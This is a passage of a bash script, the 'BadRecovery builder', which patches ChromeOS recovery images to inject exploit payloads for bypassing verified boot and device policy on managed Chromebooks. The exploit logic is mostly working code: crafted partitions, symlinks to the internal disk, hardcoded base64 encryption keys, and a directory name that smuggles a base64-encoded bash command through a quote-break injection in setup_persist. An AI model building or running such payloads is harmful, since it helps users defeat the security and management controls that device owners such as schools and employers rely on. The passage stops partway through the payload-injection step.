#!/usr/bin/env bash
# shellcheck disable=SC2086
SCRIPT_DIR=$(dirname "$0")
SCRIPT_DIR=${SCRIPT_DIR:-"."}
. "$SCRIPT_DIR/lib/wax_common.sh"

set -eE

SCRIPT_DATE="2024-10-07"

echo "┌────────────────────────────────────────────────────────────────┐"
echo "│ Welcome to the BadRecovery builder                             │"
echo "│ Credits: OlyB                                                  │"
echo "│ https://github.com/BinBashBanana/badrecovery                   │"
echo "│ Script date: $SCRIPT_DATE                                        │"
echo "└────────────────────────────────────────────────────────────────┘"

[ "$EUID" -ne 0 ] && fail "Please run as root"
missing_deps=$(check_deps partx sgdisk mkfs.ext4 cryptsetup lvm numfmt tar)
[ -n "$missing_deps" ] && fail "The following required commands weren't found in PATH:\n${missing_deps}"

IMAGE_SIZE_BUFFER=$((1 * 1024 * 1024 * 1024)) # 1 GiB should be sufficient
TEMPFILES=()
LOOPDEV=
LOOPDEV2=
VG_NAME=
MNT_ROOT=
MNT_STATE=
MNT_ENCSTATEFUL=

cleanup() {
	if [ -d "$MNT_ENCSTATEFUL" ]; then
		umount "$MNT_ENCSTATEFUL" && rmdir "$MNT_ENCSTATEFUL"
		cryptsetup close "$ENCSTATEFUL_NAME" || :
	fi
	[ -d "$MNT_STATE" ] && umount "$MNT_STATE" && rmdir "$MNT_STATE"
	[ -d "$MNT_ROOT" ] && umount "$MNT_ROOT" && rmdir "$MNT_ROOT"
	if [ -n "$VG_NAME" ]; then
		lvm vgchange -an "$VG_NAME" || :
		lvm vgmknodes || :
	fi
	[ -z "$LOOPDEV2" ] || losetup -d "$LOOPDEV2" || :
	[ -z "$LOOPDEV" ] || losetup -d "$LOOPDEV" || :
	rm -f "${TEMPFILES[@]}"
	trap - EXIT INT
}

fancy_bool() {
	if [ $1 -ge 1 ]; then
		echo "yes"
	else
		echo "no"
	fi
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

key_wrapped() {
	cat <<EOF | base64 -d
24Ep0qun5ICJWbKYmhcwtN5tkMrqPDhDN5EonLetftgqrjbiUD3AqnRoRVKw+m7l
EOF
}

key_cs() {
	cat <<EOF | base64 -d
p2/YL2slzb2JoRWCMaGRl1W0gyhUjNQirmq8qzMN4Do=
EOF
}

# TOTALLY not stolen from chromeos-install
fast_dd() {
  # Usage: fast_dd <count> <seek> <skip> other dd args
  # Note: <count> and <seek> are in units of SRC_BLKSIZE, while <skip> is in
  # units of DST_BLKSIZE.
  local user_count="$1"
  local user_seek="$2"
  local user_skip="$3"
  local chunk_num="$4"
  local total_chunks="$5"
  shift 5
  # Provide some simple progress updates to the user.
  set -- "$@" status=progress
  # Find the largest block size that all the parameters are a factor of.
  local block_size=$((2 * 1024 * 1024))
  while [ $(((user_count * SRC_BLKSIZE) % block_size)) -ne 0 ] || \
         [ $(((user_skip * SRC_BLKSIZE) % block_size)) -ne 0 ] || \
         [ $(((user_seek * DST_BLKSIZE) % block_size)) -ne 0 ]; do

    : $((block_size /= 2))
  done

  # Print a humble info line if the block size is not super, and complain more
  # loudly if it's really small (and the partition is big).
  if [ "${block_size}" -ne $((2 * 1024 * 1024)) ]; then
    echo "DD with block size ${block_size}"
    if [ "${block_size}" -lt $((128 * 1024)) ] && \
        [ $((user_count * SRC_BLKSIZE)) -gt $((128 * 1024 * 1024)) ]; then
      echo
      echo "WARNING: DOING A SLOW MISALIGNED dd OPERATION. PLEASE FIX"
      echo "count=${user_count} seek=${user_seek} skip=${user_skip}"
      echo "SRC_BLKSIZE=${SRC_BLKSIZE} DST_BLKSIZE=${DST_BLKSIZE}"
      echo
    fi
  fi

  # Convert the block counts in their respective sizes into the common block
  # size, and blast off.
  local count_common=$((user_count * SRC_BLKSIZE / block_size))
  local seek_common=$((user_seek * DST_BLKSIZE / block_size))
  local skip_common=$((user_skip * SRC_BLKSIZE / block_size))

  if [ "${total_chunks}" -ne 1 ]; then
    # Divide the count by the number of chunks, rounding up.  This is the
    # chunk size.
    local chunk_size=$(((count_common + total_chunks - 1) / total_chunks))

    : $(( seek_common += chunk_size * (chunk_num - 1) ))
    : $(( skip_common += chunk_size * (chunk_num - 1) ))

    if [ "${chunk_num}" -ne "${total_chunks}" ]; then
      count_common="${chunk_size}"
    else
      : $(( count_common -= chunk_size * (chunk_num - 1) ))
    fi
  fi

  dd "$@" bs="${block_size}" seek="${seek_common}" skip="${skip_common}" \
      "count=${count_common}"
}

detect_image_features() {
	local version_line chunks_line rootfs_line modules_path
	MNT_ROOT=$(mktemp -d)
	mount -o ro "$1" "$MNT_ROOT"

	IMAGE_VERSION=
	if [ -f "$MNT_ROOT/etc/lsb-release" ]; then
		if version_line="$(grep -m 1 "^CHROMEOS_RELEASE_CHROME_MILESTONE=[0-9]" "$MNT_ROOT/etc/lsb-release")"; then
			IMAGE_VERSION=$(echo "$version_line" | grep -o "[0-9]*")
		fi
	else
		fail "Could not find /etc/lsb-release"
	fi
	if [ -z "$IMAGE_VERSION" ]; then
		fail "Could not find image version."
	fi
	log_info "Detected version: $IMAGE_VERSION"
	if [ $IMAGE_VERSION -gt 124 ]; then
		fail "Image version is too new. Please use an image for r124 or older."
	fi

	TARGET_ARCH=x86
	if [ -f "$MNT_ROOT/bin/bash" ]; then
		case "$(file -b "$MNT_ROOT/bin/bash" | awk -F ', ' '{print $2}' | tr '[:upper:]' '[:lower:]')" in
			*aarch64* | *armv8* | *arm*) TARGET_ARCH=arm ;;
		esac
	fi
	log_info "Detected architecture: $TARGET_ARCH"

	CHUNKS=1
	LVM_STATEFUL=0
	if [ -f "$MNT_ROOT/usr/sbin/chromeos-install" ]; then
		if chunks_line="$(grep -m 1 "^NUM_ROOTFS_CHUNKS=[0-9]" "$MNT_ROOT/usr/sbin/chromeos-install")"; then
			CHUNKS=$(echo "$chunks_line" | grep -o "[0-9]*")
		fi
		grep -q '^DEFINE_boolean lvm_stateful "${FLAGS_TRUE}"' "$MNT_ROOT/usr/sbin/chromeos-install" && LVM_STATEFUL=1
	else
		fail "Could not find /usr/sbin/chromeos-install"
	fi
	log_info "Detected chunks: $CHUNKS"
	if [ $IMAGE_VERSION -lt 86 ] && [ $CHUNKS -ne 1 ]; then
		fail "Unexpected chunk count (expected 1)"
	elif [ $IMAGE_VERSION -ge 86 ] && [ $CHUNKS -ne 4 ]; then
		fail "Unexpected chunk count (expected 4)"
	fi
	log_info "Detected LVM stateful: $(fancy_bool $LVM_STATEFUL)"

	ROOTA_BASE_SIZE=$((1024 * 1024 * 1024 * 4))
	LAYOUTV3=0
	if [ -f "$MNT_ROOT/usr/sbin/write_gpt.sh" ]; then
		if rootfs_line="$(grep -m 1 "^ROOTFS_PARTITION_SIZE=[0-9]" "$MNT_ROOT/usr/sbin/write_gpt.sh")"; then
			ROOTA_BASE_SIZE=$(echo "$rootfs_line" | grep -o "[0-9]*")
		fi
		grep -q "MINIOS" "$MNT_ROOT/usr/sbin/write_gpt.sh" && LAYOUTV3=1
	else
		fail "Could not find /usr/sbin/write_gpt.sh"
	fi
	log_info "Detected ROOT-A size: $(format_bytes $ROOTA_BASE_SIZE)"
	log_info "Detected layout v3: $(fancy_bool $LAYOUTV3)"

	KERNEL_VERSION=
	SUPPORTS_BIG_DATE=0
	modules_path=$(echo "$MNT_ROOT/lib/modules"/* | head -n 1)
	if [ -d "$modules_path" ]; then
		KERNEL_VERSION=$(basename "$modules_path" | grep -oE "^[0-9]+\.[0-9]+") || :
	fi
	if [ -z "$KERNEL_VERSION" ]; then
		log_warn "Could not find kernel version. Will assume no big date support"
	else
		log_info "Detected kernel version: $KERNEL_VERSION"
		check_semver_ge "$KERNEL_VERSION" 4 4 && SUPPORTS_BIG_DATE=1
	fi
	log_info "Detected big date support: $(fancy_bool $SUPPORTS_BIG_DATE)"

	umount "$MNT_ROOT"
	rmdir "$MNT_ROOT"
}

determine_internal_disk() {
	local selected
	if [ -n "$FLAGS_internal_disk" ]; then
		INTERNAL_DISK="$FLAGS_internal_disk"
	elif [ $YES -eq 1 ]; then
		INTERNAL_DISK=mmcblk0
	else
		echo "Choose your internal disk type and press enter:"
		echo "1) mmcblk0 (eMMC)"
		echo "2) mmcblk1 (eMMC)"
		echo "3) nvme0n1 (NVMe)"
		echo "4) sda (other SSD)"
		echo "5) sdb (other SSD)"
		echo "6) hda (HDD)"
		while :; do
			read -re selected
			case "$selected" in
				1) INTERNAL_DISK=mmcblk0 ; break ;;
				2) INTERNAL_DISK=mmcblk1 ; break ;;
				3) INTERNAL_DISK=nvme0n1 ; break ;;
				4) INTERNAL_DISK=sda ; break ;;
				5) INTERNAL_DISK=sdb ; break ;;
				6) INTERNAL_DISK=hda ; break ;;
				*) echo "Invalid input, try again" ;;
			esac
		done
	fi
	log_info "Internal disk: $INTERNAL_DISK"
}

confirm_fourths_mode() {
	local estimated_size selected
	estimated_size=$(((ROOTA_BASE_SIZE + OVERFLOW_SIZE) * CHUNKS))
	log_warn "You have selected basic/persist when postinst is available, image size will be very large (about $(format_bytes $estimated_size))"
	if [ $YES -eq 0 ]; then
		echo "Do you want to continue? (y/N)"
		read -re selected
		case "$selected" in
			[yY]) : ;;
			*) fail "Aborting..." ;;
		esac
	fi
}

determine_type() {
	local enabled_var
	log_info "Supports postinst: $(fancy_bool $ENABLE_POSTINST)"
	log_info "Supports postinst_sym: $(fancy_bool $ENABLE_POSTINST_SYM)"
	log_info "Supports persist: $(fancy_bool $ENABLE_PERSIST)"
	log_info "Supports basic: $(fancy_bool $ENABLE_BASIC)"
	log_info "Supports unverified: $(fancy_bool $ENABLE_UNVERIFIED)"

	if [ -n "$FLAGS_type" ]; then
		enabled_var="ENABLE_$(echo "$FLAGS_type" | tr '[:lower:]' '[:upper:]')"
		if [ "${!enabled_var}" -eq 1 ]; then
			TYPE="$FLAGS_type"
		else
			fail "'$FLAGS_type' is not supported by this image."
		fi
	elif [ $ENABLE_UNVERIFIED -eq 1 ] && [ $IMAGE_VERSION -le 41 ]; then
		TYPE=unverified
	elif [ $ENABLE_POSTINST -eq 1 ]; then
		TYPE=postinst
	elif [ $ENABLE_POSTINST_SYM -eq 1 ] && [ $SUPPORTS_BIG_DATE -eq 1 ]; then
		TYPE=postinst_sym
	elif [ $ENABLE_PERSIST -eq 1 ]; then
		TYPE=persist
	elif [ $ENABLE_BASIC -eq 1 ]; then
		TYPE=basic
	else
		fail "Nothing supported by this image :("
	fi
}

mkpayload() {
	local name file
	if [ $PAYLOAD_ONLY -eq 1 ]; then
		name="${1:-payload}"
		file=$(mktemp "$name.XXXXX.bin")
		log_info "Creating $name at $file" >&2
		chown "$USER:$USER" "$file"
		echo "$file"
	else
		mktemp
	fi
}

mkfs() {
	mkfs.ext4 -F -b 4096 -O ^metadata_csum,uninit_bg "$@"
}

setup_roota() {
	local src_dir
	src_dir="$SCRIPT_DIR"/postinst
	[ -d "$src_dir" ] || fail "Could not find postinst payload '$src_dir'"
	suppress mkfs "$1"
	MNT_ROOT=$(mktemp -d)
	mount -o loop "$1" "$MNT_ROOT"

	cp -R "$src_dir"/* "$MNT_ROOT"
	chmod +x "$MNT_ROOT"/postinst

	umount "$MNT_ROOT"
	rmdir "$MNT_ROOT"
}

setup_persist() {
	local src_dir cmd_dir
	src_dir="$SCRIPT_DIR"/persist
	[ -d "$src_dir" ] || fail "Could not find persistence payload '$src_dir'"
	mkdir -p "$MNT_ENCSTATEFUL"/var/lib/whitelist/persist "$MNT_ENCSTATEFUL"/var/cache "$MNT_STATE"/unencrypted/import_extensions
	cp -R "$src_dir"/* "$MNT_ENCSTATEFUL"/var/lib/whitelist/persist
	cmd_dir="---persist---';echo $(echo 'bash <(cat /var/lib/whitelist/persist/init.sh)'|base64 -w0)|base64 -d|setsid -f bash;echo '"
	mkdir "$MNT_ENCSTATEFUL/var/lib/whitelist/$cmd_dir"
	ln -s "/var/lib/whitelist/$cmd_dir" "$MNT_ENCSTATEFUL"/var/cache/external_cache
}

find_unallocated_sectors() {
	local allgaps gapstart gapsize difference
	if allgaps=$("$SFDISK" -F "$1" | grep "^\s*[0-9]"); then
		while read gap; do
			gapstart=$(echo "$gap" | awk '{print $1}')
			gapsize=$(echo "$gap" | awk '{print $3}')
			difference=$((gapstart - $3))
			if [ "$difference" -lt 0 ]; then
				: $((gapstart -= difference))
				: $((gapsize -= difference))
			fi
			if [ "$(echo "$gap" | awk '{print $2}')" -ge "$gapstart" ] && [ "$gapsize" -ge "$2" ]; then
				echo "$gapstart"
				return
			fi
		done <<<"$allgaps"
	fi
	return 1
}

move_blocking_partitions() {
	local part_table part_starts physical_part_table needs_move move_sizes total_move_size started this_num this_start this_size new_end gapstart
	part_table=$("$CGPT" show -q "$1")
	part_starts=$(echo "$part_table" | awk '{print $1}' | sort -n)
	physical_part_table=()
	for part in $part_starts; do
		physical_part_table+=("$(echo "$part_table" | grep "^\s*${part}\s")")
	done

	needs_move=()
	move_sizes=()
	total_move_size=0
	started=0
	for i in "${!physical_part_table[@]}"; do
		this_num=$(echo "${physical_part_table[$i]}" | awk '{print $3}')
		if [ $this_num -eq $2 ]; then
			started=1
		elif [ $started -eq 0 ]; then
			continue
		fi
		this_start=$(echo "${physical_part_table[$i]}" | awk '{print $1}')
		this_size=$(echo "${physical_part_table[$i]}" | awk '{print $2}')
		if [ $this_num -eq $2 ]; then
			new_end=$((this_start + $3))
			continue
		elif [ $this_start -le $new_end ]; then
			needs_move+=($this_num)
			move_sizes+=($this_size)
			: $((total_move_size+=this_size))
		else
			break
		fi
	done

	[ -n "$needs_move" ] || return 0
	log_info "Moving partitions: ${needs_move[@]}"
	log_debug "sizes: ${move_sizes[@]}"
	log_debug "total sectors to move: $total_move_size"

	for i in "${!needs_move[@]}"; do
		gapstart=$(find_unallocated_sectors "$1" "${move_sizes[$i]}" "$new_end") || :
		[ -n "$gapstart" ] || fail "Not enough unpartitioned space in image."
		log_debug "gap start: $gapstart"
		suppress "$SFDISK" -N "${needs_move[$i]}" --move-data "$1" <<<"$gapstart"
	done
}

trap 'echo $BASH_COMMAND failed with exit code $?. THIS IS A BUG, PLEASE REPORT!' ERR
trap 'cleanup; exit' EXIT
trap 'echo Abort.; cleanup; exit' INT

get_flags() {
	load_shflags

	FLAGS_HELP="Usage: $0 -i <path/to/image.bin> [flags]"

	DEFINE_string image "" "Path to recovery image" "i"

	DEFINE_string type "" "Type (postinst, postinst_sym, persist, basic, or unverified)" "t"

	DEFINE_string internal_disk "" "Internal disk for postinst_sym (mmcblk0, mmcblk1, nvme0n1, sda...)"

	DEFINE_boolean yes "$FLAGS_FALSE" "Assume yes for all questions" "y"

	DEFINE_boolean payload_only "$FLAGS_FALSE" "Generate payloads but don't modify image (image not required)" ""

	DEFINE_string encstateful_payload "" "Path to custom encstateful payload (tar)" "p"

	DEFINE_boolean devmode "$FLAGS_FALSE" "Create .developer_mode (persist, basic only)" "e"

	DEFINE_string finalsizefile "" "Write final image size in bytes to this file" ""

	DEFINE_boolean debug "$FLAGS_FALSE" "Print debug messages" "d"

	FLAGS "$@" || exit $?

	IMAGE="$FLAGS_image"
	YES=0
	PAYLOAD_ONLY=0
	if [ "$FLAGS_yes" = "$FLAGS_TRUE" ]; then
		YES=1
	fi
	if [ "$FLAGS_payload_only" = "$FLAGS_TRUE" ]; then
		PAYLOAD_ONLY=1
	fi

	if [ -z "$IMAGE" ] && [ $PAYLOAD_ONLY -eq 0 ]; then
		flags_help || :
		exit 1
	fi
	case "$FLAGS_type" in
		""|postinst|postinst_sym|persist|basic|unverified) : ;;
		*) echo "Invalid type '$FLAGS_type'"; flags_help || :; exit 1 ;;
	esac
	if [ -n "$FLAGS_encstateful_payload" ] && [ "$FLAGS_type" != basic ]; then
		echo "Must specify --type=basic when using --encstateful_payload"
		flags_help || :
		exit 1
	fi
}

[ -z "$SUDO_USER" ] || USER="$SUDO_USER"
get_flags "$@"

BASIC_VERSION=1
PAST_2038=0
ENABLE_POSTINST=0
ENABLE_POSTINST_SYM=0
ENABLE_PERSIST=0
ENABLE_BASIC=0

# this will always be enabled
ENABLE_UNVERIFIED=1

if [ -z "$IMAGE" ]; then
	# assume everything works when using --payload_only and no image
	TARGET_ARCH=x86
	LVM_STATEFUL=1
	LAYOUTV3=1
	SUPPORTS_BIG_DATE=1
	ENABLE_POSTINST=1
	ENABLE_POSTINST_SYM=1
	ENABLE_PERSIST=1
	ENABLE_BASIC=1
else
	if [ -b "$IMAGE" ]; then
		log_info "Image is a block device, performance may suffer..."
	else
		check_file_rw "$IMAGE" || fail "$IMAGE doesn't exist, isn't a file, or isn't RW"
		check_slow_fs "$IMAGE"
	fi
	check_gpt_image "$IMAGE" || fail "$IMAGE is not GPT, or is corrupted"

	log_info "Creating loop device"
	LOOPDEV=$(losetup -f)
	if [ $PAYLOAD_ONLY -eq 1 ]; then
		losetup -r -P "$LOOPDEV" "$IMAGE"
	else
		losetup -P "$LOOPDEV" "$IMAGE"
	fi

	detect_image_features "${LOOPDEV}p3"

	if [ $(date +%s) -gt 2147483647 ]; then
		PAST_2038=1
	fi
	if [ $IMAGE_VERSION -ge 86 ] && [ $LAYOUTV3 -eq 0 ]; then
		ENABLE_POSTINST=1
	fi
	if [ $IMAGE_VERSION -ge 34 ]; then
		if [ $SUPPORTS_BIG_DATE -eq 0 ] && [ $PAST_2038 -eq 1 ]; then
			log_warn "Past 2038, will not enable postinst_sym"
		else
			ENABLE_POSTINST_SYM=1
		fi
	fi
	if [ $IMAGE_VERSION -ge 26 ]; then
		if [ $IMAGE_VERSION -lt 90 ]; then
			ENABLE_PERSIST=1
		fi
		if [ $IMAGE_VERSION -lt 120 ]; then
			ENABLE_BASIC=1
			if [ $IMAGE_VERSION -ge 99 ]; then
				BASIC_VERSION=2
			fi
		fi
	fi
fi

OVERFLOW=1
ROOTA_CHUNKS=1
IMAGE_STATEFUL_PAYLOAD=

determine_type
log_info "Using type: $TYPE"
case "$TYPE" in
	postinst)
		TARGET_ROOTA_SIZE=$((64 * 1024 * 1024)) # 64 MiB
		IMAGE_STATEFUL_SIZE=$((4 * 1024 * 1024)) # 4 MiB
		log_info "Creating ROOT-A payload"
		TARGET_ROOTA_PAYLOAD=$(mkpayload root-a)
		OVERFLOW_SIZE="$TARGET_ROOTA_SIZE"
		OVERFLOW_PAYLOAD="$TARGET_ROOTA_PAYLOAD"
		[ $PAYLOAD_ONLY -eq 1 ] || TEMPFILES+=("$TARGET_ROOTA_PAYLOAD")
		truncate -s "$TARGET_ROOTA_SIZE" "$TARGET_ROOTA_PAYLOAD"
		setup_roota "$TARGET_ROOTA_PAYLOAD"
		;;
	postinst_sym)
		TARGET_ROOTA_SIZE=$((16 * 1024 * 1024)) # 16 MiB
		TARGET_STATEFUL_SIZE=$((4 * 1024 * 1024)) # 4 MiB
		LVM_STATEFUL_SIZE=$((8 * 1024 * 1024)) # 8 MiB
		IMAGE_STATEFUL_SIZE=$((32 * 1024 * 1024)) # 32 MiB
		determine_internal_disk
		TARGET_DEVICE=$(format_part_number "/dev/$INTERNAL_DISK" 3)
		log_info "Creating ROOT-A payload"
		TARGET_ROOTA_PAYLOAD=$(mkpayload root-a)
		[ $PAYLOAD_ONLY -eq 1 ] || TEMPFILES+=("$TARGET_ROOTA_PAYLOAD")
		truncate -s "$TARGET_ROOTA_SIZE" "$TARGET_ROOTA_PAYLOAD"
		setup_roota "$TARGET_ROOTA_PAYLOAD"

		MNT_STATE=$(mktemp -d)
		log_info "Creating stateful payload"
		TARGET_STATEFUL_PAYLOAD=$(mkpayload stateful)
		[ $PAYLOAD_ONLY -eq 1 ] || TEMPFILES+=("$TARGET_STATEFUL_PAYLOAD")
		truncate -s "$TARGET_STATEFUL_SIZE" "$TARGET_STATEFUL_PAYLOAD"
		suppress mkfs "$TARGET_STATEFUL_PAYLOAD"
		mount -o loop "$TARGET_STATEFUL_PAYLOAD" "$MNT_STATE"
		# ensure compatibility with both before and after https://crrev.com/c/2434286
		mkdir -p "$MNT_STATE"/unencrypted/import_extensions/import_extensions
		ln -s "$TARGET_DEVICE" "$MNT_STATE"/unencrypted/import_extensions/image
		ln -s "$TARGET_DEVICE" "$MNT_STATE"/unencrypted/import_extensions/import_extensions/image
		umount "$MNT_STATE"

		if [ $LVM_STATEFUL -eq 1 ]; then
			log_info "Creating LVM stateful"
			LVM_STATEFUL_PAYLOAD=$(mkpayload lvm-stateful)
			OVERFLOW_SIZE="$LVM_STATEFUL_SIZE"
			OVERFLOW_PAYLOAD="$LVM_STATEFUL_PAYLOAD"
			[ $PAYLOAD_ONLY -eq 1 ] || TEMPFILES+=("$LVM_STATEFUL_PAYLOAD")
			truncate -s "$LVM_STATEFUL_SIZE" "$LVM_STATEFUL_PAYLOAD"
			LOOPDEV2=$(losetup -f)
			losetup "$LOOPDEV2" "$LVM_STATEFUL_PAYLOAD"
			suppress lvm pvcreate -ff --yes "$LOOPDEV2"
			VG_DEV=$(mktemp -u /dev/XXXXXXXXXX)
			VG_NAME=$(basename "$VG_DEV")
			suppress lvm vgcreate -p 1 "$VG_NAME" "$LOOPDEV2"
			suppress lvm vgchange -ay "$VG_NAME"
			suppress lvm lvcreate -Z n -L "${TARGET_STATEFUL_SIZE}B" -n unencrypted "$VG_NAME"
			suppress lvm vgmknodes || :
			LV_DEV="$VG_DEV"/unencrypted
			[ -b "$LV_DEV" ] || fail "Could not create LVM stateful"
			suppress dd count=1 bs="$TARGET_STATEFUL_SIZE" if="$TARGET_STATEFUL_PAYLOAD" of="$LV_DEV" conv=notrunc
			sync
			suppress lvm vgchange -an "$VG_NAME"
			suppress lvm vgmknodes || :
			VG_NAME=
			losetup -d "$LOOPDEV2"
			LOOPDEV2=
		else
			OVERFLOW_SIZE="$TARGET_STATEFUL_SIZE"
			OVERFLOW_PAYLOAD="$TARGET_STATEFUL_PAYLOAD"
		fi

		log_info "Creating image stateful payload"
		IMAGE_STATEFUL_PAYLOAD=$(mkpayload image-stateful)
		[ $PAYLOAD_ONLY -eq 1 ] || TEMPFILES+=("$IMAGE_STATEFUL_PAYLOAD")
		truncate -s "$IMAGE_STATEFUL_SIZE" "$IMAGE_STATEFUL_PAYLOAD"
		suppress mkfs "$IMAGE_STATEFUL_PAYLOAD"
		mount -o loop "$IMAGE_STATEFUL_PAYLOAD" "$MNT_STATE"
		mkdir -p "$MNT_STATE"/unencrypted/import_extensions
		cp "$TARGET_ROOTA_PAYLOAD" "$MNT_STATE"/unencrypted/import_extensions/image
		touch -t 244605100000 "$MNT_STATE"/unencrypted/import_extensions/image
		umount "$MNT_STATE"
		rmdir "$MNT_STATE"
		;;
	persist|basic)
		ENCSTATEFUL_SIZE=$((32 * 1024 * 1024)) # 32 MiB
		TARGET_STATEFUL_SIZE=$((64 * 1024 * 1024)) # 64 MiB
		IMAGE_STATEFUL_SIZE=$((4 * 1024 * 1024)) # 4 MiB
		if [ $IMAGE_VERSION -lt 68 ]; then
			log_warn "persist/basic is untested on versions below 68 and may not work."
		fi
		if [ $ENABLE_POSTINST -eq 1 ] && [ $PAYLOAD_ONLY -eq 0 ]; then
			# fourths mode
			confirm_fourths_mode
			ROOTA_CHUNKS=$CHUNKS
		fi
		# todo: maybe support LVM stateful here?
		log_info "Creating stateful payload"
		TARGET_STATEFUL_PAYLOAD=$(mkpayload stateful)
		OVERFLOW_SIZE="$TARGET_STATEFUL_SIZE"
		OVERFLOW_PAYLOAD="$TARGET_STATEFUL_PAYLOAD"
		[ $PAYLOAD_ONLY -eq 1 ] || TEMPFILES+=("$TARGET_STATEFUL_PAYLOAD")
		truncate -s "$TARGET_STATEFUL_SIZE" "$TARGET_STATEFUL_PAYLOAD"
		suppress mkfs -L H-STATE "$TARGET_STATEFUL_PAYLOAD"
		MNT_STATE=$(mktemp -d)
		MNT_ENCSTATEFUL=$(mktemp -d)
		mount -o loop "$TARGET_STATEFUL_PAYLOAD" "$MNT_STATE"

		log_info "Setting up encstateful"
		truncate -s "$ENCSTATEFUL_SIZE" "$MNT_STATE"/encrypted.block
		ENCSTATEFUL_DEV=$(mktemp -u /dev/mapper/XXXXXXXXXX)
		ENCSTATEFUL_NAME=$(basename "$ENCSTATEFUL_DEV")
		ENCSTATEFUL_KEY=$(mktemp)
		TEMPFILES+=("$ENCSTATEFUL_KEY")
		key_cs > "$ENCSTATEFUL_KEY"
		cryptsetup open --type plain --cipher aes-cbc-essiv:sha256 --key-size 256 --key-file "$ENCSTATEFUL_KEY" "$MNT_STATE"/encrypted.block "$ENCSTATEFUL_NAME"

		log_info "Creating encstateful"
		suppress mkfs "$ENCSTATEFUL_DEV"
		mount "$ENCSTATEFUL_DEV" "$MNT_ENCSTATEFUL"

		if [ -n "$FLAGS_encstateful_payload" ]; then
			ENCSTATEFUL_TAR="$FLAGS_encstateful_payload"
		elif [ $BASIC_VERSION -eq 2 ]; then
			ENCSTATEFUL_TAR="$SCRIPT_DIR"/encstateful/devicesettings.tar.gz
		else
			ENCSTATEFUL_TAR="$SCRIPT_DIR"/encstateful/whitelist.tar.gz
		fi
		[ -f "$ENCSTATEFUL_TAR" ] || fail "Could not find encstateful payload '$ENCSTATEFUL_TAR'"
		tar -xf "$ENCSTATEFUL_TAR" -C "$MNT_ENCSTATEFUL"

		if [ "$TYPE" = persist ]; then
			setup_persist
		fi

		key_wrapped > "$MNT_STATE"/encrypted.needs-finalization
		if [ "$FLAGS_devmode" = "$FLAGS_TRUE" ]; then
			touch "$MNT_STATE"/.developer_mode
		fi
		if [ "$FLAGS_debug" = "$FLAGS_TRUE" ]; then
			echo "Stateful:"
			tree -a "$MNT_STATE" || :
			echo "Encstateful:"
			tree -a "$MNT_ENCSTATEFUL" || :
		fi

		umount "$MNT_ENCSTATEFUL"
		rmdir "$MNT_ENCSTATEFUL"
		cryptsetup close "$ENCSTATEFUL_NAME"
		umount "$MNT_STATE"
		rmdir "$MNT_STATE"
		;;
	unverified)
		OVERFLOW=0
		TARGET_ROOTA_SIZE=$((64 * 1024 * 1024)) # 64 MiB
		IMAGE_STATEFUL_SIZE=$((4 * 1024 * 1024)) # 4 MiB
		log_info "Creating ROOT-A payload"
		TARGET_ROOTA_PAYLOAD=$(mkpayload root-a)
		MAIN_PAYLOAD_SIZE="$TARGET_ROOTA_SIZE"
		MAIN_PAYLOAD="$TARGET_ROOTA_PAYLOAD"
		[ $PAYLOAD_ONLY -eq 1 ] || TEMPFILES+=("$TARGET_ROOTA_PAYLOAD")
		truncate -s "$TARGET_ROOTA_SIZE" "$TARGET_ROOTA_PAYLOAD"

		src_dir="$SCRIPT_DIR"/unverified
		[ -d "$src_dir" ] || fail "Could not find unverified payload '$src_dir'"
		src_busybox="$SCRIPT_DIR"/busybox/"$TARGET_ARCH"/busybox
		[ -f "$src_busybox" ] || fail "Could not find busybox '$src_busybox'"
		suppress mkfs "$TARGET_ROOTA_PAYLOAD"
		MNT_ROOT=$(mktemp -d)
		mount -o loop "$TARGET_ROOTA_PAYLOAD" "$MNT_ROOT"

		mkdir -p "$MNT_ROOT"/usr/sbin "$MNT_ROOT"/bin "$MNT_ROOT"/dev "$MNT_ROOT"/proc "$MNT_ROOT"/run "$MNT_ROOT"/sys "$MNT_ROOT"/tmp "$MNT_ROOT"/var
		cp "$src_busybox" "$MNT_ROOT"/bin
		cp -R "$src_dir"/* "$MNT_ROOT"/usr/sbin
		chmod +x "$MNT_ROOT"/bin/busybox "$MNT_ROOT"/usr/sbin/chromeos-recovery

		umount "$MNT_ROOT"
		rmdir "$MNT_ROOT"
		;;
	*) fail "how did we get here?" ;;
esac

if [ $PAYLOAD_ONLY -eq 0 ]; then
	suppress sgdisk -e "$IMAGE" 2>&1 | sed 's/\a//g'

	SECTOR_SIZE=$(get_sector_size "$LOOPDEV")
	SRC_BLKSIZE="$SECTOR_SIZE"
	DST_BLKSIZE="$SECTOR_SIZE"
	OLD_SECTORS=$(get_sectors "$LOOPDEV")
	OLD_SIZE=$((SECTOR_SIZE * OLD_SECTORS))

	suppress "$SFDISK" --delete "$LOOPDEV" 1 || :

	if [ $OVERFLOW -eq 1 ]; then
		OVERFLOW_OFFSET=0
		if [ $LAYOUTV3 -eq 1 ]; then
			OVERFLOW_OFFSET=$((4 * 1024 * 1024)) # extra 4 MiB for POWERWASH-DATA
		fi

		ROOTA_NEW_PER_CHUNK_SIZE=$((ROOTA_BASE_SIZE + OVERFLOW_OFFSET + OVERFLOW_SIZE))
		ROOTA_NEW_SIZE=$((ROOTA_NEW_PER_CHUNK_SIZE * ROOTA_CHUNKS))
		EXPANDED_SIZE=$((ROOTA_NEW_SIZE + IMAGE_SIZE_BUFFER))

		log_info "Payload size: $(format_bytes $OVERFLOW_SIZE)"
		log_info "Maximum new image size: $(format_bytes $EXPANDED_SIZE)"

		if [ $EXPANDED_SIZE -gt $OLD_SIZE ]; then
			resize_image "$EXPANDED_SIZE" "$IMAGE" "$LOOPDEV"
		fi

		move_blocking_partitions "$LOOPDEV" 3 "$((ROOTA_NEW_SIZE / SECTOR_SIZE))"

		log_info "Resizing ROOT-A"
		"$CGPT" add "$LOOPDEV" -i 3 -s "$((ROOTA_NEW_SIZE / SECTOR_SIZE))"
		partx -u -n 3 "$LOOPDEV"

		log_info "Injecting payload"
		suppress fast_dd "$((OVERFLOW_SIZE / SECTOR_SIZE))" "$(((ROOTA_BASE_SIZE + OVERFLOW_OFFSET) / SECTOR_SIZE))" 0 1 1 if="$OVERFLOW_PAYLOAD" of="${LOOPDEV}p3" conv=notrunc

		if [ $ROOTA_CHUNKS -gt 1 ]; then
			log_info "Duplicating chunked data"
